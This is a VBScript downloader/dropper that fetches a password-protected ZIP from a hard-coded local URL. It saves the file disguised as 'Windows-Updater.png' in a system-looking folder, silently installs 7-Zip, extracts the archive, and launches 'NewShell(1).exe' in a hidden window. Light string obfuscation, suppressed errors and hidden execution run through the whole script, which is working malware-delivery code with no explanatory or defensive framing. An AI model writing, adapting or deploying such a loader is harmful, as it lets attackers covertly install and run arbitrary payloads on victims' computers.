Option Explicit

Function Deob(s)
    Deob = Replace(s, "[+]", "")
End Function

Sub DownloadFile(url, fileOutPath)
    On Error Resume Next
    Dim http, stream
    Set http = CreateObject("Microsoft.XMLHTTP")
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile fileOutPath, 2
        stream.Close
    Else
        WScript.Echo "Error downloading file. HTTP Status: " & http.Status
        WScript.Quit
    End If
End Sub

Sub RenameFile(oldPath, newPath)
    On Error Resume Next
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(oldPath) Then
        fso.MoveFile oldPath, newPath
    Else
        WScript.Echo "Error renaming file. Source file not found: " & oldPath
        WScript.Quit
    End If
End Sub

Function Is7ZipInstalled()
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    Is7ZipInstalled = fso.FileExists(Deob("C:[+]\\Program Files[+]\\7-Zip\\7z.exe"))
End Function

Sub Install7Zip()
    Dim url, temp, installerPath
    url = Deob("https:[+]//www.7-zip.org[+]/a/7z2301-x64.exe")
    temp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
    installerPath = temp & "\7zSetup.exe"
    DownloadFile url, installerPath
    CreateObject("WScript.Shell").Run """" & installerPath & """ /S", 0, True
End Sub

Sub ExtractZipWithPassword(zipPath, extractTo, password)
    Dim cmd, exePath, shell
    exePath = """C:\Program Files\7-Zip\7z.exe"""
    
    ' Construct the 7-Zip command with correct quoting for paths with spaces
    cmd = exePath & " x """ & zipPath & """ -o""" & extractTo & """ -p" & password & " -y"
    
    ' Debugging: Show the command
    WScript.Echo "Running 7-Zip command: " & cmd
    
    ' Execute the command using cmd /c to extract
    Set shell = CreateObject("WScript.Shell")
    shell.Run "cmd /c """ & cmd & """", 0, True
    
    ' Check if the EXE file exists after extraction
    If Not CreateObject("Scripting.FileSystemObject").FileExists(extractTo & "\NewShell(1).exe") Then
        WScript.Echo "Error: EXE file not found after extraction."
        WScript.Quit
    End If

    WScript.Echo "Extraction completed successfully."
End Sub

Sub RunExecutable(exePath)
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    ' Run the executable
    WScript.Echo "Running executable: " & exePath
    shell.Run """" & exePath & """", 0, False
End Sub

Sub Main()
    On Error Resume Next

    Dim url, folderPath, fakePng, zipPath, password, exe

    url = Deob("http://127.0.0.1/Downloads/NewShell%281%29.zip")
    folderPath = "C:\ProgramData\Windows"
    fakePng = folderPath & "\Windows-Updater.png"
    zipPath = folderPath & "\Windows-Updater.zip"
    password = "123"
    exe = folderPath & "\NewShell(1).exe" ' Path to the executable

    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder folderPath
    End If

    ' Step 1: Download ZIP file and save as PNG
    WScript.Echo "Downloading ZIP file..."
    DownloadFile url, fakePng
    RenameFile fakePng, zipPath

    ' Step 2: Check if 7-Zip is installed, and install if needed
    If Not Is7ZipInstalled() Then
        WScript.Echo "7-Zip not found. Installing..."
        Install7Zip
        WScript.Sleep 10000 ' Wait for 7-Zip installation to complete
    End If

    ' Step 3: Extract ZIP file using 7-Zip
    WScript.Echo "Extracting ZIP file..."
    ExtractZipWithPassword zipPath, folderPath, password

    ' Step 4: Run the EXE file
    If fso.FileExists(exe) Then
        WScript.Echo "Running executable..."
        RunExecutable exe
    Else
        WScript.Echo "Error: EXE file not found at: " & exe
        WScript.Quit
    End If
End Sub

Main
